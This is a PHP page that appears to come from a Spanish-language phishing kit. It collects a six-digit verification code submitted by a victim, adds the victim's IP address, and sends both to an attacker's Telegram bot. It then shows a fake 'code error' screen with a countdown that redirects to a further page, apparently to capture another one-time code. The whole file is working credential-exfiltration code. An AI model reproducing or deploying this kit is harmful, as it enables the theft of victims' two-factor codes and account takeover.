<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_del_tel.php');

if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){
	

$message = "Codigo1: ".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']." \r\n".$userp."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}else{ header ('location: index.html'); exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>home</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="cese/util.css">
	<link rel="stylesheet" type="text/css" href="cese/main.css">
 <script language="JavaScript">
	var tiempo=30;
    var url="index4.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos <br>Le estamos enviando un nuevo código a tu celular";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post" action="">
					<div align="center">
						<img src="cese/ccanjja.png" style="width:200px;">
					</div>
					
					
					
					  
  	<div align="center"><img src="cese/err.png" style="width:90px;">
								
								<br><br>
								<span style="font-size:22px;color:red">¡ERROR DE CÓDIGO!</span>
								
								<br><br><br>
								
								
								<font id="contador" style=" font-size:18px;"></font>
								</div>

					<div class="text-center p-t-115">
						<img src="cese/bottom.png" style="width:100px;">
						

					</div>
				</form>
			</div>
		</div>
	</div>

</body>
</html>